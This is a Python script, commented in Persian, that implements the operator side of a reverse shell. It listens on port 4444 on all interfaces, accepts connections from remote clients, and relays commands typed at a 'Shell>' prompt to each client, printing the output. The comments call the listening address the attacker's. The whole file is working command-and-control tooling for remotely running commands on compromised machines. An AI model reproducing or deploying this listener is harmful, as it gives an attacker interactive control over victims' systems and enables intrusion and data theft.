import socket
import threading

class Listener:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.server = None

    def send_command_to_client(self, client_socket):
        while True:
            # دریافت دستور از کاربر
            command = input("Shell> ")
            
            if command.lower() == 'exit':
                print("Closing connection...")
                client_socket.send(command.encode())
                client_socket.close()
                break
            
            # ارسال دستور به کلاینت
            client_socket.send(command.encode())
            
            # دریافت نتیجه از کلاینت
            response = client_socket.recv(4096).decode()
            print(response)

    def handle_client(self, client_socket, addr):
        print(f"Connection established with {addr}")
        self.send_command_to_client(client_socket)

    def start_listener(self):
        # راه‌اندازی سرور
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.lhost, self.lport))
        self.server.listen(5)
        print(f"Listening on {self.lhost}:{self.lport}...")

        while True:
            # پذیرش اتصالات ورودی
            client_socket, addr = self.server.accept()
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket, addr))
            client_handler.start()

    def close_listener(self):
        if self.server:
            self.server.close()
            print(f"Server on {self.lhost}:{self.lport} closed.")

# اجرای لیسنر
if __name__ == "__main__":
    # آدرس IP و پورت مهاجم را تنظیم کنید
    listener = Listener("0.0.0.0", 4444)  # مهاجم به تمام IP‌ها گوش می‌دهد
    try:
        listener.start_listener()
    except KeyboardInterrupt:
        print("\nServer interrupted by user.")
        listener.close_listener()
